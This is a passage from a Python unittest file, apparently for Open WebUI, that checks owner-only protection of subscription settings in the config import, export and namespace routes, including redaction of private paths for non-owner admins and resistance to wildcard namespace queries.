            SUBSCRIPTIONS_PROVIDERS={},
        )
        with self.assertRaises(HTTPException) as ctx:
            await mgr.update_config(form_clear, owner)
        self.assertEqual(ctx.exception.status_code, 400)


class TestGenericConfigRoutesAndIsolation(unittest.TestCase):
    """Test generic config route boundaries (/import, /export, /namespace) without global process pollution."""

    def test_generic_config_routes_subscription_protection(self):
        """Test import/export/namespace boundaries directly using live router functions and mock store."""
        repo = pathlib.Path(BASE_DIR)
        store = {
            'subscriptions.owner_id': 'admin-A',
            'subscriptions.providers': {'claude': {'enabled': True, 'config_dir': '/synthetic/private-cli-dir', 'binary_path': '/bin/claude'}},
            'subscriptions.enable': True,
            'openai.api_configs': {'key': 'openai-val'},
        }

        class MockConfig:
            @staticmethod
            async def upsert(updates): store.update(updates)
            @staticmethod
            async def get_all(): return dict(store)
            @staticmethod
            async def get_namespace(ns):
                import sqlite3
                with sqlite3.connect(':memory:') as db:
                    db.execute('CREATE TABLE config_keys (key TEXT)')
                    db.executemany('INSERT INTO config_keys VALUES (?)', [(k,) for k in store])
                    keys = db.execute('SELECT key FROM config_keys WHERE key LIKE ?', (f'{ns}.%',))
                    return {key: store[key] for (key,) in keys}
            @staticmethod
            async def get(k, default=''): return store.get(k, default)

        async def publish_event(*args, **kwargs): pass

        scope = {
            'Config': MockConfig,
            'MFA_CONFIG_KEYS': {'ENABLE_MFA': 'auth.mfa.enable'},
            'publish_event': publish_event,
            'EVENTS': SimpleNamespace(CONFIG_IMPORTED='config.imported'),
            'get_admin_user': lambda: None,
            'Depends': lambda f: None,
            'Request': object,
            'HTTPException': HTTPException,
            'status': status,
        }

        def extract(path, names):
            tree = ast.parse((repo / path).read_text())
            nodes = [n for n in tree.body if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name in names]
            for n in nodes: n.decorator_list = []
            unit = ast.Module(body=[ast.ImportFrom(module='__future__', names=[ast.alias(name='annotations')], level=0)] + nodes, type_ignores=[])
            exec(compile(ast.fix_missing_locations(unit), '<live-functions>', 'exec'), scope)

        extract('backend/open_webui/utils/mfa.py', {'update_mfa_config'})
        mod = types.ModuleType('open_webui.utils.mfa')
        mod.update_mfa_config = scope['update_mfa_config']
        old_mfa = sys.modules.get('open_webui.utils.mfa')
        sys.modules['open_webui.utils.mfa'] = mod

        try:
            extract('backend/open_webui/routers/configs.py', {'import_config', 'export_config', 'get_config_namespace'})

            async def run_scenario():
                admin_a = SimpleNamespace(id='admin-A', role='admin')
                admin_b = SimpleNamespace(id='admin-B', role='admin')

                # 1. Non-owner export omits owner_id and redacts private provider paths
                data = await scope['export_config'](user=admin_b)
                self.assertNotIn('subscriptions.owner_id', data)
                self.assertEqual(data['subscriptions.providers']['claude']['config_dir'], '')
                self.assertEqual(data['subscriptions.providers']['claude']['binary_path'], '')
                self.assertEqual(data['openai.api_configs'], {'key': 'openai-val'})

                # 2. Owner export contains full owner_id and paths
                owner_data = await scope['export_config'](user=admin_a)
                self.assertEqual(owner_data['subscriptions.owner_id'], 'admin-A')
                self.assertEqual(owner_data['subscriptions.providers']['claude']['config_dir'], '/synthetic/private-cli-dir')

                # 3. Non-owner namespace omits owner_id and redacts paths
                ns_data = await scope['get_config_namespace']('subscriptions', user=admin_b)
                self.assertNotIn('subscriptions.owner_id', ns_data)
                self.assertEqual(ns_data['subscriptions.providers']['claude']['config_dir'], '')

                for namespace in ('sub%', '%'):
                    wildcard_data = await scope['get_config_namespace'](namespace, user=admin_b)
                    self.assertNotIn('subscriptions.owner_id', wildcard_data)
                    self.assertEqual(wildcard_data['subscriptions.providers']['claude']['config_dir'], '')
                    self.assertEqual(wildcard_data['subscriptions.providers']['claude']['binary_path'], '')

                # 4. Non-owner import attempting to modify subscription keys fails 403
                with self.assertRaises(HTTPException) as ctx:
                    await scope['import_config'](
                        SimpleNamespace(),
                        SimpleNamespace(config={'subscriptions.owner_id': 'admin-B'}),
                        user=admin_b,
                    )
                self.assertEqual(ctx.exception.status_code, 403)

                # 5. Non-owner import of unrelated config succeeds
                await scope['import_config'](
                    SimpleNamespace(),
                    SimpleNamespace(config={'ollama.api_configs': {'model': 'llama3'}}),
                    user=admin_b,
                )
                self.assertEqual(store['ollama.api_configs'], {'model': 'llama3'})

                # 6. Owner import strips subscription keys so generic import never overwrites subscriptions
                res = await scope['import_config'](
                    SimpleNamespace(),
                    SimpleNamespace(config={'subscriptions.owner_id': 'admin-C', 'ui.visibility': {}}),
                    user=admin_a,
                )
                self.assertEqual(store['subscriptions.owner_id'], 'admin-A')
                self.assertIn('_subscription_notice', res)

            asyncio.run(run_scenario())
        finally:
            if old_mfa is None:
                sys.modules.pop('open_webui.utils.mfa', None)
            else:
                sys.modules['open_webui.utils.mfa'] = old_mfa

    def test_parent_sys_modules_has_no_stubs(self):
        """Verify that running tests did not pollute parent sys.modules with stubs."""
        for shim in ('validators', 'aiocache', 'PIL', 'mcp'):
            # If not installed on the system, it must NOT be present in sys.modules
            try:
                import importlib.util
                is_installed = importlib.util.find_spec(shim) is not None
            except Exception:
                is_installed = False
            if not is_installed:
                self.assertNotIn(shim, sys.modules, f'Leaked stub {shim} into parent sys.modules!')


if __name__ == '__main__':
    unittest.main()
